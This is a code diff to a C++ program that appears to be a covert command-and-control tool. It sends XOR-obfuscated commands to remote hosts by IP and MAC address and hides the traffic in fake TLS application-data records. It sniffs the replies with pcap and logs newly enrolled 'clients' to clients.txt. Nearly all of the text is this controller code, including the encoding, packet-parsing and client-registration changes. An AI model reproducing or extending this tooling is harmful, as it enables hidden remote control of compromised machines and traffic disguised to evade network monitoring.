@@ -128,6 +128,7 @@ int mode_manager(std::string option, std::string address, std::string mac_addr);
 int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_number);
 DWORD WINAPI command_console(PVOID pPARAM);
 int capture();
+int command_check(std::string command);
 
 int main()
 {
@@ -190,6 +191,7 @@ int mode_manager(std::string option, std::string address, std::string mac_addr) 
 							command[i] = command[i] ^ 'H';
 						}
 						connected_mode_send(address, mac_addr, option, command, identification_number);
+						capture();
 						identification_number++;
 						std::cout << "1)Enter command" << std::endl;
 						std::cin >> command;
@@ -224,6 +226,7 @@ int mode_manager(std::string option, std::string address, std::string mac_addr) 
 					command[i] = command[i] ^ 'H';
 				}
 				connected_mode_send(address, mac_addr, option, command, identification_number);
+				capture();
 				identification_number++;
 				std::cout << "1)Enter command" << std::endl;
 				std::cin >> command;
@@ -783,7 +786,9 @@ int decapsulate(const u_char *data, int size) {
 			mac_address = mac_address + byte;
 
 			//check total packet length
+			std::cout << "Total length" << ih->tlen << std::endl;
 			int total_packet_length = ((ih->tlen & 0xFF) << 8) | ((ih->tlen >> 8) & 0xFF); //length of data
+			std::cout << "Total length" << total_packet_length << std::endl;
 			total_packet_length = total_packet_length - 20 - (ip_head_len * 4);
 
 			if (ip_head_len > 5) {
@@ -810,7 +815,7 @@ int decapsulate(const u_char *data, int size) {
 				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
 				th = (tcp_head *)((u_char*)ih + head_len);
 
-				std::cout << "Flags: " << (int)th->control_bits << std::endl;
+				//std::cout << "Flags: " << (int)th->control_bits << std::endl;
 				//check control bit number for ack-psh packet
 				if ((int)th->control_bits == 24) {
 					//decapsulate TLS header
@@ -818,9 +823,12 @@ int decapsulate(const u_char *data, int size) {
 
 					//have to flip bits because of memory type
 					if (tls_head->type == 23) {
-						int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+						//std::cout << tls_head->length << std::endl;
+						//int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+						int tls_data_len = tls_head->length - 7;
 						u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
 						std::string command; //string that will contain command used
+						//std::cout << tls_data_len << std::endl;
 						for (int i = 0; i < tls_data_len; i++) {
 							//get data
 							command = command + (char)*data_char;
@@ -831,8 +839,11 @@ int decapsulate(const u_char *data, int size) {
 						for (int i = 0; i < command.length(); i++) {
 							command[i] = command[i] ^ 'H';
 						}
-						std::cout << command << std::endl;
-						return 1;
+						//check to see if packet is a new client address
+						if (command_check(command)== 0) {
+							std::cout << command << std::endl;
+							return 1;
+						}
 					}
 				}
 			}
@@ -1052,4 +1063,36 @@ int size_of_list(pcap_if_t*  list) {
 	}
 
 	return size;
+}
+
+/*
+*This function will check commands to see
+*if it is a client adding itself to the net
+*return: is 0 if not client and 1 if client
+*/
+int command_check(std::string command) {
+	int command_len = command.length();
+
+	//check length of command
+	if (command_len > 24 && command_len < 46) {
+		std::vector<std::string> bytes;
+		split(command, ' ', bytes);
+		//check for ip and mac address
+		if (bytes.size() == 2) {
+			//verify mac address size
+			if (bytes[1].length() == 17) {
+				//write to file
+				std::ofstream myfile;
+				myfile.open("clients.txt", std::ofstream::out | std::ofstream::app);
+				if (myfile.is_open()) {
+					command = command + "\n";
+					myfile << command;
+					myfile.close();
+					return 1;
+				}
+
+			}
+		}
+	}
+	return 0;
 }
